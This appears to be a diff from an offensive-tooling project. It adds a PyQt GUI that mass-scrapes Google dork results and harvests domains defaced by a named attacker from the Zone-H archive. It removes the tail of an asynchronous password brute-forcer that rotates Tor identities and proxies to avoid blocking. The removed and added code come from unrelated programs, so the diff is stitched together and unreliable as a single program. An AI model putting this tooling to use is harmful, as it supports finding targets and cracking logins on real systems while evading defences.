+    def Save_ReverseIPResults(self):
+        self.save_path, _ = QFileDialog.getSaveFileName(self, "Save File", f"{current_dir}", "Text Files (*.txt)")
+        if self.save_path:
+            try:
+                with open(self.save_path, 'w') as file:
+                    file.write(self.console_log.toPlainText())
+                self.console_log.setPlainText(f"Reverse IP results saved successfully to: {self.save_path}")
+            except Exception as e:
+                self.console_log.setPlainText(f"Error saving file: {e}")
+
+
+
+#This coded was operated in 2022-2023 jst remastered 
+class KillAllPageWorker(QThread):
+    result_signal = pyqtSignal(str)  # SENT RESULT
+
+    def __init__(self, query_list, n_pages, blocked_domains, save_path, domain_radio, url_radio, url_domain_radio, parent=None):
+        super().__init__(parent)
+        self.path_file = save_path
+        self.dork_queries = query_list
+        self.n_pages = n_pages
+        self.blocked_domains = blocked_domains
+        self.domain_radio = domain_radio
+        self.url_radio = url_radio
+        self.url_domain_radio = url_domain_radio
         
-        batch_size = config.batch_size
-        semaphore = asyncio.Semaphore(batch_size)
+    
+    def Domain_Kicker(self, domain):
+        domain_data = str(domain).split('/')
+        domain_value = domain_data[0] + "//" + domain_data[2] + '/' 
+        return domain_value
         
-        password_batches = [passwords[i:i + batch_size] for i in range(0, len(passwords), batch_size)]
-        
-        for i, batch in enumerate(password_batches):
-            print(f"Processing batch {i+1}/{len(password_batches)} ({len(batch)} passwords)")
-            
-            results = await process_password_batch(
-                brute_forcer, config.username, batch, semaphore, config
-            )
-            
-            for result in results:
-                report_generator.add_result(result)
-                
-                status_msg = f"[{result.attempt_number:4d}] {result.password:<20} → {result.message}"
-                if result.proxy_used != "None":
-                    status_msg += f" (Proxy: {result.proxy_used})"
-                if config.logging.log_response_times and result.response_time > 0:
-                    status_msg += f" ({result.response_time:.2f}s)"
-                
-                print(status_msg)
-                
-                if result.success:
-                    print(f"\n🎉 SUCCESS: Password found: {result.password}")
-                    report_generator.end_timing()
+    def captcha_google(self, driver):
+        """Handles CAPTCHA detection and waits for it to resolve"""
+        try:
+            element = driver.find_element(By.XPATH, "//div[@class='g-recaptcha']")
+            WebDriverWait(driver, timeout=5000).until(EC.staleness_of(element))  # Wait until CAPTCHA is solved
+        except Exception as e:
+            print(f"Error handling CAPTCHA: {e}")  # Log any errors encountered
+
+    def run(self):
+        driver_path = ChromeDriverManager().install()
+        options = Options()
+        options.add_argument("--log-level=3")
+        options.add_experimental_option("excludeSwitches", ["disable-logging"])
+        driver = webdriver.Chrome(service=Service(driver_path), options=options)
+
+        try:
+            for query_x in self.dork_queries:
+                for page in range(1, self.n_pages + 1):
+                    url = f"http://www.google.com/search?q={query_x}&start={(page - 1) * 10}"
+                    TRYNG = True
                     
-                    report = report_generator.generate_report()
-                    report_generator.save_report(report, "bruteforce_report.json")
-                    
-                    if config.logging.log_response_times:
-                        brute_forcer.response_tracker.log_stats(logger)
-                        session_manager.response_tracker.log_stats(logger)
-                        if proxy_manager:
-                            proxy_manager.response_tracker.log_stats(logger)
-                    
-                    return
-            
-            # Rotate connection after each batch
-            if use_tor:
-                session_manager.change_tor_identity()
-            elif proxy_manager and not session_manager.use_direct_connection:
-                new_proxy = await proxy_manager.get_next_proxy()
-                if new_proxy:
-                    logger.info(f"Rotating to proxy: {new_proxy}")
-                    session_manager.create_session()
+                    while TRYNG: 
+                        driver.get(url)
+                        soup = BeautifulSoup(driver.page_source, 'html.parser')
+
+                        # check if search got captcha 
+                        if 'Our systems have detected' in soup.text:
+                            self.captcha_google(driver)  #manually complete captcha and retry
+                        else:
+                            TRYNG = False  #Try Again after complete captcha
+                            search = soup.find_all('div', class_="yuRUbf")
+                            if search:
+                                for h in search:
+                                    link = h.a['href']
+                                    if link:
+                                        blocked = False
+                                        for blocked_domain in self.blocked_domains:
+                                            if blocked_domain in link:
+                                                blocked = True
+                                                break
+                                        if not blocked:
+                                            result = f"[{page}] : {link}"
+                                            self.result_signal.emit(result)  
+                                            
+                                            if self.domain_radio:
+                                                domain_ = self.Domain_Kicker(link)
+                                                with open(f'{self.path_file}_Domain.txt', 'a') as file:
+                                                    file.write(domain_ + '\n')
+
+                                            if self.url_radio:
+                                                with open(f'{self.path_file}_URLink.txt', 'a') as file:
+                                                    file.write(link + '\n')
+
+                                            if self.url_domain_radio:
+                                                domain_ = self.Domain_Kicker(link)
+                                                with open(f'{self.path_file}_URLink.txt', 'a') as file:
+                                                    file.write(link + '\n')
+                        
+                                                with open(f'{self.path_file}_Domain.txt', 'a') as file:
+                                                    file.write(domain_ + '\n')
+
+        except:
+            pass
+
+
+class Google_Grabber(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.save_path = ""
+        self.threads = [] 
+        self.qt_UI()
+        
+    def qt_UI(self):
+        layout = QVBoxLayout(self)
+        self.setLayout(layout)
+
+        # Just title or you can remove it 
+        mode_selection_label = QLabel("Wizard Grabber :D !!")
+        mode_selection_label.setFont(QFont("Arial", 20, QFont.Weight.Bold))
+        layout.addWidget(mode_selection_label)
+
+        radio_and_input_layout = QHBoxLayout()
+        radio_font = QFont("Arial", 12)
+
+        self.domain_radio = QRadioButton('Domain        ')
+        self.domain_radio.setFont(radio_font)
+
+        self.url_radio = QRadioButton('URL        ')
+        self.url_radio.setFont(radio_font)
+
+        self.url_domain_radio = QRadioButton('Domain + URL        ')
+        self.url_domain_radio.setFont(radio_font)
+
+        radio_and_input_layout.addWidget(self.domain_radio)
+        radio_and_input_layout.addWidget(self.url_radio)
+        radio_and_input_layout.addWidget(self.url_domain_radio)
+        radio_and_input_layout.addStretch()
+
+        #num input of page you want scrape of google
+        self.number_input_label = QLabel("How Many Pages:")
+        self.number_input_label.setFont(QFont("Arial", 12))
+        self.Num_Page = QSpinBox()
+        self.Num_Page.setFixedSize(70, 40)
+        self.Num_Page.setFont(QFont("Arial", 12))
+        self.Num_Page.setRange(1, 100)
+        self.Num_Page.setValue(10)
+
+        self.Num_Page.setStyleSheet("""
+            QSpinBox::up-button, QSpinBox::down-button {
+                width: 0;
+                height: 0;
+                border: none;
+            }
+            QSpinBox {
+                padding-right: 5px;  /* Adjust padding to make it look good without arrows */
+            }
+        """)
+
+        radio_and_input_layout.addWidget(self.number_input_label)
+        radio_and_input_layout.addWidget(self.Num_Page)
+
+        layout.addLayout(radio_and_input_layout)
+
+        # TextArea input Dork_List
+        self.dork_list = QTextEdit()
+        self.dork_list.setPlaceholderText("Dork_List here")
+        self.dork_list.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
+        self.dork_list.setStyleSheet(Editor_TXTStyle())
+
+        # TextArea add block_domain
+        self.block_domain = QTextEdit()
+        self.block_domain.setPlaceholderText("Filter Block Domain : Must add without http/https or www")
+        self.block_domain.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
+        self.block_domain.setStyleSheet(Editor_TXTStyle())
+
+        # Load Block_domains from file TXT
+        self.Load_DomainBlocker()
+        
+        # Domain_LOG textArea
+        self.domain_result = QTextEdit()
+        self.domain_result.setPlaceholderText("Domain Logged")
+        self.domain_result.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
+        self.domain_result.setStyleSheet(Editor_TXTStyle())
+
+        # Dork List, Add Block Domain, and Domain Result
+        list_layout = QHBoxLayout()
+        left_layout = QVBoxLayout()
+
+        left_layout.addWidget(self.dork_list)
+        left_layout.addWidget(self.block_domain)
+
+        list_layout.addLayout(left_layout)
+        list_layout.addWidget(self.domain_result)
+        layout.addLayout(list_layout)
+
+        # Bottom Buttons (Start Grabber, Save Result, Save Blocked Domains)
+        button_layout = QHBoxLayout()
+
+        self.start_grabber_btn = QPushButton('Start Grabber')
+        self.start_grabber_btn.setFixedSize(150, 40)
+        self.start_grabber_btn.setStyleSheet(button_start())
+        self.start_grabber_btn.clicked.connect(self.start_grabber)
+
+        self.save_result_btn = QPushButton('Save Result')
+        self.save_result_btn.setFixedSize(150, 40)
+        self.save_result_btn.setStyleSheet(button_style())
+
+        self.save_blocked_domains_btn = QPushButton('Save Blocked Domains')
+        self.save_blocked_domains_btn.setFixedSize(200, 40)
+        self.save_blocked_domains_btn.setStyleSheet(button_style())
+
+
+        self.save_result_btn.clicked.connect(self.SaveResult)
+        self.save_blocked_domains_btn.clicked.connect(self.save_blocked_domains)
+
+        button_layout.addWidget(self.save_blocked_domains_btn)
+        button_layout.addWidget(self.start_grabber_btn)
+        button_layout.addWidget(self.save_result_btn)
+        
+        
+        layout.addLayout(button_layout)
+        
+    def save_blocked_domains(self):
+        blocked_domains = self.block_domain.toPlainText()
+        with open('domain_block.txt', 'w') as file:
+            file.write(blocked_domains)
+
+    def SaveResult(self):
+        self.save_path, _ = QFileDialog.getSaveFileName(self, "Save File", f"{current_dir}", "Text Files (*.txt)")
+        if not self.save_path:
+            QMessageBox.warning(self, "No Save Path", "Please select a valid save path.")
+            return False
+
+        if not (self.domain_radio.isChecked() or self.url_radio.isChecked() or self.url_domain_radio.isChecked()):
+            QMessageBox.warning(self, "No Option Selected", "Please select Domain, URL, or Domain + URL option.")
+            return False
+
+        self.path_file, file_extension = os.path.splitext(self.save_path)
+
+        try:
+            if self.domain_radio.isChecked():
+                domain_file_path = f'{self.path_file}_Domain.txt'
+                with open(domain_file_path, 'w') as domain_file:
+                    domain_file.write(self.domain_result.toPlainText())
+
+            elif self.url_radio.isChecked():
+                url_file_path = f'{self.path_file}_URLink.txt'
+                with open(url_file_path, 'w') as url_file:
+                    url_file.write(self.domain_result.toPlainText())
+
+            elif self.url_domain_radio.isChecked():
+                domain_file_path = f'{self.path_file}_Domain.txt'
+                with open(domain_file_path, 'w') as domain_file:
+                    domain_file.write(self.domain_result.toPlainText())
+
+                url_file_path = f'{self.path_file}_URLink.txt'
+                with open(url_file_path, 'w') as url_file:
+                    url_file.write(self.domain_result.toPlainText())
+
+            QMessageBox.information(self, "Save Successful", "Files saved successfully!")
+            return True
+
+        except Exception as e:
+            QMessageBox.critical(self, "Error Saving", f"Error Saving : {e}")
+            return False
+        
+    
+    def start_grabber(self):
+        self.path_file, file_extension = os.path.splitext(self.save_path)
+        if not self.path_file:
+            QMessageBox.information(self, "Not Found", "Please Save Result *txt")
+            return
+
+        #dork_input
+        dork_queries = self.dork_list.toPlainText().splitlines()
+        n_pages = self.Num_Page.value()
+        blocked_domains = self.Load_DomainBlocker()
+
+        # Check if a domain filter is selected
+        domain_radio_checked = self.domain_radio.isChecked()
+        url_radio_checked = self.url_radio.isChecked()
+        url_domain_radio_checked = self.url_domain_radio.isChecked()
+
+        if not (domain_radio_checked or url_radio_checked or url_domain_radio_checked):
+            QMessageBox.warning(self, "No Option Selected", "Please select Domain, URL, or Domain + URL option.")
+            return
+        
+        self.task_th = KillAllPageWorker(dork_queries, n_pages, blocked_domains, self.path_file,
+                                               domain_radio_checked, url_radio_checked, url_domain_radio_checked)
+        self.task_th.result_signal.connect(self.update_result)
+        self.task_th.start()
+
+
+       
+    def update_result(self, result):
+        self.domain_result.append(result)
+
+
+
+    def Load_DomainBlocker(self):
+        blocked_domains_list = []
+        if os.path.exists('domain_block.txt'):
+            with open('domain_block.txt', 'r') as file:
+                blocked_domains = file.readlines()  
+                blocked_domains_list = [domain.strip() for domain in blocked_domains]  # Strip spaces/newlines
+                self.block_domain.setPlainText("\n".join(blocked_domains_list))  # Set Display in the txtArea
+        else:
+            self.block_domain.setPlainText("")  # Clear if no file domain_block.txt
+        return blocked_domains_list 
+
+        
+
+
+
+class ZoneH_GrabThread(QThread):
+    update_output = pyqtSignal(str)
+
+    def __init__(self, attacker_name, save_path, n_pages):
+        super().__init__()
+        self.attacker_name = attacker_name
+        self.n_pages = n_pages
+        self.save_located = save_path
+
+    def setup_driver(self):
+        chrome_options = Options()
+        chrome_options.add_argument('--no-sandbox')
+        chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
+        chrome_options.add_argument('--log-level=0')
+        # chrome_options.add_argument('--headless') #dont run with headless will be hidden chrome and users cant see captcha to complete in manually
+
+        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
+        return driver
+
+
+    def captcha(self, driver):
+        element = driver.find_element('xpath', "//*[text() = 'Copy the code:']")
+        datax = WebDriverWait(driver, timeout=2000).until(EC.staleness_of(element))
+        return datax
+
+    def run(self):
+        driver = self.setup_driver()
+        i = 0
+        try:
+            for page in range(self.n_pages):
+                url = f"https://www.zone-h.org/archive/notifier={self.attacker_name}/page={page}"
+                driver.get(url)
+                soup = BeautifulSoup(driver.page_source, 'html.parser')
+
+                if 'Copy the code:' in soup.text and 'If you often get this captcha when gathering data, please contact us' in soup.text:
+                    self.update_output.emit("[INFO] Please solve Captcha in manually.")
+                    self.captcha(driver)
                 else:
-                    logger.error("No working proxies available. Trying direct connection...")
-                    session_manager.use_direct_connection = True
-                    session_manager.create_session()
-            
-            # Progress indicator
-            processed = (i + 1) * batch_size
-            if processed % 50 == 0 or i == len(password_batches) - 1:
-                elapsed = time.time() - report_generator.start_time
-                rate = processed / elapsed if elapsed > 0 else 0
-                eta = (len(passwords) - processed) / rate if rate > 0 else 0
-                print(f"Progress: {processed}/{len(passwords)} ({processed/len(passwords)*100:.1f}%) | "
-                      f"Rate: {rate:.1f} p/s | ETA: {eta:.0f}s")
-    
-    except KeyboardInterrupt:
-        print("\n\n⚠️  Attack interrupted by user")
-    
-    except Exception as e:
-        logging.error(f"Unexpected error: {str(e)}")
-        print("\n❌ Error occurred. Pausing instead of crashing...")
-        await asyncio.sleep(10)
-    
-    finally:
-        if 'report_generator' in locals():
-            report_generator.end_timing()
-            report = report_generator.generate_report()
-            report_generator.save_report(report, "bruteforce_report.json")
-            
-            print("\n❌ Brute-force attack completed.")
-            if 'report' in locals():
-                print(f"Total time: {report['summary']['total_time']}")
-                print(f"Total attempts: {report['summary']['total_attempts']}")
-                print(f"Success rate: {report['summary']['success_rate']}")
-            
-            if 'config' in locals() and config.logging.log_response_times:
-                if 'brute_forcer' in locals():
-                    brute_forcer.response_tracker.log_stats(logger)
-                if 'session_manager' in locals():
-                    session_manager.response_tracker.log_stats(logger)
-                if 'proxy_manager' in locals():
-                    proxy_manager.response_tracker.log_stats(logger)
+                    if 'Total notifications' in soup.text and 'Legend' in soup.text:
+                        try:
+                            tablezoneh = soup.find('table', {'id': 'ldeface'})
+                            bodyzoneh = tablezoneh.find('tbody')
 
-def main():
-    """Main function"""
-    asyncio.run(main_async())
+                            for tr in bodyzoneh.find_all('tr'):
+                                tds = tr.find_all('td')
+                                if len(tds) < 8:
+                                    continue
 
-if __name__ == "__main__":
-    main()
+                                date = tds[0].text.strip()
+                                domain = tds[7].text.strip()
+
+                                if 'Domain' not in domain:
+                                    i += 1
+
+                                    if '/' in domain:
+                                        domain = str(domain.split('/', 1)[0])
+                                    if '...' in domain:
+                                        domain = str(domain).replace('...', '')
+
+                                    output = f'[{i}] Domain : {domain} ---> Page >>> {page} | {date}'
+                                    self.update_output.emit(output)
+                                
+                                    with open(f'{self.save_located}', 'a') as f_takedown:
+                                        f_takedown.write(domain + '\n')
+                                    with open('BlackCat_Result/AllZoneH_Domain.txt', 'a') as f_all:
+                                        f_all.write(domain + '\n')
+
+                        except Exception as e:
+                            self.update_output.emit(f"Error Page {page}: {e}")
+            driver.quit()                
+        except Exception as e:
+            self.update_output.emit(f"Error: {e}")
+        
+        
+#Func has coded in 2022-23 
+#Warning page 51 no need change all just 51 pages only no more less
+class ZoneH_Grabber(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.save_path = ""
+        self.init_UI()
+
+    def init_UI(self):
+        self.setWindowTitle("ZoneH Grabber")
+        self.setGeometry(100, 100, 600, 400)
+
+        layout = QVBoxLayout()
+        attacker_label = QLabel("Attacker Name:")
+        attacker_label.setStyleSheet("font-size: 16px; font-weight: bold; color: #ECF0F1;")
+        layout.addWidget(attacker_label)
+
+        self.attacker_input = QLineEdit(self)
+        self.attacker_input.setPlaceholderText("Enter Attacker Name")
+        self.attacker_input.setStyleSheet(input_style())
+        layout.addWidget(self.attacker_input)
+
+        self.output_box = QTextEdit(self)
+        self.output_box.setReadOnly(True)
+        self.output_box.setPlaceholderText("Zone-Log")
+        self.output_box.setStyleSheet(Editor_TXTStyle())
+        layout.addWidget(self.output_box)
+
+        button_layout = QHBoxLayout()
+
+        self.save_button = QPushButton("Save", self)
+        self.save_button.setFixedSize(150, 40)
+        self.save_button.setStyleSheet(button_style())
+        self.save_button.clicked.connect(self.Save_DATA)
+        
+        self.grab_button = QPushButton("START-H", self)
+        self.grab_button.setFixedSize(150, 40)
+        self.grab_button.setStyleSheet("""
+        QPushButton {
+            background-color: #8A2BE2;
+            color: white;
+            font-size: 16px;
+            border: none;
+        }
+        QPushButton:hover {
+            background-color: #1ABC9C;
+        }
+        QPushButton:pressed {
+            background-color: cyan;
+        }
+                                       """)
+        self.grab_button.clicked.connect(self.START_ZH)
+
+        button_layout.addWidget(self.grab_button)
+        button_layout.addWidget(self.save_button)
+
+        layout.addLayout(button_layout)
+        self.setLayout(layout)
+
+
+    def Save_DATA(self):
+        attacker_name = self.attacker_input.text()
+        
+        if attacker_name:
+
+            # OpenDialog Start BlackCat_Result folder
+            self.save_path, _ = QFileDialog.getSaveFileName(self, "Save File", f"{current_dir}/{attacker_name}", "Text Files (*.txt)")
+            
+            if self.save_path:
+                try:
+                    with open(self.save_path, 'w') as file:
+                        file.write(self.output_box.toPlainText())
+                # except Exception as e:
+                #     print(f"Error saving file: {e}")
+                except:
+                    pass 
+    def START_ZH(self):
+        attacker_name = self.attacker_input.text()
+        if not self.save_path:
+            QMessageBox.warning(self, "No Save Path", "Please select a valid save path.")
+        else:
+            #verify again
+            if attacker_name or self.save_path:
+                self.grab_thread = ZoneH_GrabThread(attacker_name, self.save_path, 51)
+                self.grab_thread.update_output.connect(self.update_console)
+                self.grab_thread.start()
+        
+    def update_console(self, text):
+        self.output_box.append(text)
+
+app = QApplication(sys.argv)
+window = MainWindow()
+window.show()
+sys.exit(app.exec()) 
